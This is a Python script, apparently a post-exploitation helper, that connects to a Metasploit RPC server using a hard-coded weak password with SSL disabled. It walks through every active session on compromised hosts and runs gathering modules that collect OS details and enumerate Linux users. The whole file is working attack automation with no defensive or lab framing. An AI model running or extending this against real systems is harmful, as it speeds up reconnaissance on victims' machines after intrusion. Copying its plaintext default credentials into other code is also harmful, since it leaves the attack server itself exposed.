# session_handler.py

from pymetasploit3.msfrpc import MsfRpcClient
import time

def connect_to_metasploit(password='password123', username='msf', port=55553):
    try:
        client = MsfRpcClient(password, username=username, port=port, ssl=False)
        print("[+] Connected to Metasploit RPC (Session Handler)")
        return client
    except Exception as e:
        print(f"[!] Failed to connect to Metasploit: {e}")
        exit(1)

def list_active_sessions(client):
    sessions = client.sessions.list
    if not sessions:
        print("[-] No active sessions found.")
        return {}
    
    print("\n=== Active Sessions ===")
    for sid, details in sessions.items():
        print(f"  ID: {sid} | Type: {details['type']} | Target: {details['target_host']}")
    return sessions

def run_post_module(client, session_id, module_path, options={}):
    post_module = client.modules.use('post', module_path)
    post_module['SESSION'] = session_id
    for k, v in options.items():
        post_module[k] = v

    print(f"[>] Running post module: {module_path} on Session {session_id}")
    try:
        post_module.execute()
        time.sleep(2)  # Give it time to complete
    except Exception as e:
        print(f"[!] Post module execution failed: {e}")

def handle_sessions():
    client = connect_to_metasploit()
    sessions = list_active_sessions(client)

    if not sessions:
        return

    for sid in sessions:
        print(f"\n[*] Handling Session {sid}")
        run_post_module(client, sid, 'post/multi/gather/os_info')
        run_post_module(client, sid, 'post/linux/gather/enum_users')  # Modify as needed for OS

if __name__ == "__main__":
    handle_sessions()

